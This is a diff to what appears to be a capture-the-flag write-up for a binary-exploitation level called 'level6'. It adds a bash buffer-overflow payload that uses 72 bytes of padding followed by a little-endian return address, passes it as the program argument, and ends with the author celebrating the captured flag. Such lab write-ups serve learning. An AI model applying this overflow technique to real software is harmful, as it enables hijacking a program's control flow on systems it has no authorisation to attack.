@@ -77,5 +77,14 @@ So, our `argv[1]` should be something in the lines of:
 
 Let's try:
 ```bash
-;
+offset=$(printf "%72s" " " | tr ' ' 'A')
+address='08048454'
+address=$(printf \\x${address:6:2}\\x${address:4:2}\\x${address:2:2}\\x${address:0:2})
+payload="${offset}${address}"
+
+./level6 "${payload}"
 ```
+
+Of course I also created an script in `./resources/exploit.sh`.
+
+And... Boom! Flag obtained! `\(^o^)/`
